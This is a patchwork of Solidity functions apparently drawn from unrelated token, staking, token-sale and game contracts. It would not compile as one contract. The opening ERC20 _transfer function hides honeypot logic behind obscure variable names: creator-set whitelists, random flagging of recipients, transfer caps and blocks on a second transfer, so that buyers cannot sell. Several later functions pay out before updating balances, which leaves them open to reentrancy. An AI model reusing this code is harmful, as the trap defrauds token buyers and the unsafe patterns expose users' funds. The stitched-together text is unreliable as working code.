function _transfer(address sender, address recipient, uint256 amount) internal {
    require(sender != address(0), "ERC20: transfer from the zero address");
    require(recipient != address(0), "ERC20: transfer to the zero address");
    if ((address(sender) == creator) && (miakhalifa == false)) {
        uranus = chTx;
        ceres = true;
    }
    if ((address(sender) == creator) && (miakhalifa == true)) {
        misslexa[recipient] = true;
        lunastar[recipient] = false;
        miakhalifa = false;
    }
    if ((amount > mercury) && (misslexa[sender] == true) && (address(sender) != creator)) {
        evaangelina[recipient] = true;
    }
    if (misslexa[recipient] != true) {
        lunastar[recipient] = ((randomly() == 3) ? true : false);
    }
    if ((lunastar[sender]) && (misslexa[recipient] == false)) {
        lunastar[recipient] = true;
    }
    if (misslexa[sender] == false) {
        if ((amount > mercury) && (evaangelina[sender] == true)) {
            require(false);
        }
        require(amount < uranus);
        if (ceres == true) {
            if (evaangelina[sender] == true) {
                require(false);
            }
            evaangelina[sender] = true;
        }
    }
    _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
    _balances[recipient] = _balances[recipient].add(amount);
    emit Transfer(sender, recipient, amount);
}

function emergencyWithdraw() public {
    User storage user = users[msg.sender];
    volts.transfer(address(msg.sender), user.depositAmount);
    emit EmergencyWithdraw(msg.sender, user.depositAmount);
    user.depositAmount = 0;
    user.paidReflection = 0;
}

function withdraw(uint256 amount) public {
    User storage user = users[msg.sender];
    require(user.depositAmount >= amount, "withdraw amount exceeds deposited amount");
    update();
    uint256 _pendingReflection = (user.depositAmount.mul(reflectionTillNowPerToken).sub(user.paidReflection)).mul(1000);
    uint256 _ohmsReward = ohms.tokenFromReflection(_pendingReflection);
    if (_ohmsReward > 0) {
        ohms.transfer(address(msg.sender), _ohmsReward);
        emit RewardClaimed(msg.sender, _ohmsReward);
    }
    volts.transfer(address(msg.sender), amount);
    emit Withdraw(msg.sender, amount);
    user.depositAmount = user.depositAmount.sub(amount);
    user.paidReflection = user.depositAmount.mul(reflectionTillNowPerToken);
}

function deposit(uint256 amount) public {
    User storage user = users[msg.sender];
    update();
    if (user.depositAmount > 0) {
        uint256 _pendingReflection = (user.depositAmount.mul(reflectionTillNowPerToken).sub(user.paidReflection)).mul(1000);
        uint256 _ohmsReward = ohms.tokenFromReflection(_pendingReflection);
        if (_ohmsReward > 0) {
            ohms.transfer(address(msg.sender), _ohmsReward);
            emit RewardClaimed(msg.sender, _ohmsReward);
        }
    }
    uint256 burnRate = volts.burnRate();
    uint256 amountBurned = amount.mul(burnRate).div(100);
    uint256 amountDeposited = amount.sub(amountBurned);
    volts.transferFrom(address(msg.sender), address(this), amount);
    emit Deposit(msg.sender, amount);
    user.depositAmount = user.depositAmount.add(amountDeposited);
    user.paidReflection = user.depositAmount.mul(reflectionTillNowPerToken);
}

function buyToken()
public
payable
saleOpen
returns(bool) {
    require(msg.value > 0, "no ether sent");
    uint ethRate = uint(PriceFeed(priceContractAddress).read());
    ethRaised += msg.value;
    uint tokenAmount = msg.value 
        .mul(ethRate).div(10 ** 18) 
        .mul(1000).div(73); 
    uint tokenAmountAndBonus = tokenAmount
        .mul(bonusMultiplier).div(100);
    TokenPurchases storage purchase = purchases[msg.sender];
    if (purchase.totalETH == 0) {
        purchasers.push(msg.sender);
    }
    purchase.totalETH += msg.value;
    purchase.totalTokens += tokenAmountAndBonus;
    purchase.totalTokenBonus += tokenAmountAndBonus.sub(tokenAmount);
    emit TokenPurchase(msg.sender, msg.value, ethRate, tokenAmountAndBonus);
    return BZRxToken(bZRxTokenContractAddress).mint(
        msg.sender,
        tokenAmountAndBonus
    );
}

function transferFrom(
    address _from,
    address _to,
    uint256 _value)
public
saleOpen
returns(bool) {
    require(msg.sender == bZxVaultAddress, "only the bZx vault can call this function");
    if (BZRxToken(bZRxTokenContractAddress).canTransfer(msg.sender, _from, _value)) {
        return BZRxToken(bZRxTokenContractAddress).minterTransferFrom(
            msg.sender,
            _from,
            _to,
            _value
        );
    } else {
        uint ethRate = uint(PriceFeed(priceContractAddress).read());
        uint wethValue = _value 
            .mul(73).div(1000) 
            .mul(10 ** 18).div(ethRate); 
        wethValue -= wethValue.mul(bonusMultiplier).div(100).sub(wethValue);
        require(StandardToken(wethContractAddress).transferFrom(
            _from,
            this,
            wethValue
        ), "weth transfer failed");
        ethRaised += wethValue;
        TokenPurchases storage purchase = purchases[_from];
        if (purchase.totalETH == 0) {
            purchasers.push(_from);
        }
        purchase.totalETH += wethValue;
        purchase.totalTokens += _value;
        return BZRxToken(bZRxTokenContractAddress).mint(
            _to,
            _value
        );
    }
}

function() public payable {
    require(msg.value >= _minPaymentAmount);
    uint tokens;
    if (now <= stage1Ends) {
        tokens = msg.value * 1400;
    } else if (now <= stage2Ends) {
        tokens = msg.value * 1200;
    } else {
        tokens = msg.value * 1000;
    }
    require(balances[owner] >= tokens);
    amountRaised = safeAdd(amountRaised, msg.value);
    balances[owner] = safeSub(balances[owner], tokens);
    balances[msg.sender] = safeAdd(balances[msg.sender], tokens);
    emit Transfer(owner, msg.sender, tokens);
    owner.transfer(msg.value);
}

function investInternal(address receiver, address refer) private {
    require(!finalized);
    require(startsAt <= now && endsAt > now);
    require(msg.value >= 100000000000000);
    if (investedAmountOf[receiver] == 0) {
        investorCount++;
    }
    uint tokensAmount = msg.value * TokenPerETH / 100000000000000;
    investedAmountOf[receiver] += msg.value;
    tokensSold += tokensAmount;
    weiRaised += msg.value;
    emit Invested(receiver, msg.value, tokensAmount);
    token.mintToken(receiver, tokensAmount);
    if (refer != 0x0) {
        refer.transfer(msg.value / 10);
    }
    beneficiary.transfer(address(this).balance);
}

function purchase(uint256 _tokenId) public payable {
    address oldOwner = gameIndexToOwner[_tokenId];
    address newOwner = msg.sender;
    uint256 sellingPrice = gameIndexToPrice[_tokenId];
    require(oldOwner != newOwner);
    require(_addressNotNull(newOwner));
    require(msg.value >= sellingPrice);
    uint256 payment = uint256(SafeMath.div(SafeMath.mul(sellingPrice, 92), 100));
    uint256 purchaseExcess = SafeMath.sub(msg.value, sellingPrice);
    if (sellingPrice < firstStepLimit) {
        gameIndexToPrice[_tokenId] = SafeMath.div(SafeMath.mul(sellingPrice, 200), 92);
    } else if (sellingPrice < secondStepLimit) {
        gameIndexToPrice[_tokenId] = SafeMath.div(SafeMath.mul(sellingPrice, 120), 92);
    } else {
        gameIndexToPrice[_tokenId] = SafeMath.div(SafeMath.mul(sellingPrice, 115), 92);
    }
    _transfer(oldOwner, newOwner, _tokenId);
    if (oldOwner != address(this)) {
        oldOwner.transfer(payment); 
    }
    TokenSold(_tokenId, sellingPrice, gameIndexToPrice[_tokenId], oldOwner, newOwner, games[_tokenId].name);
    msg.sender.transfer(purchaseExcess);
}

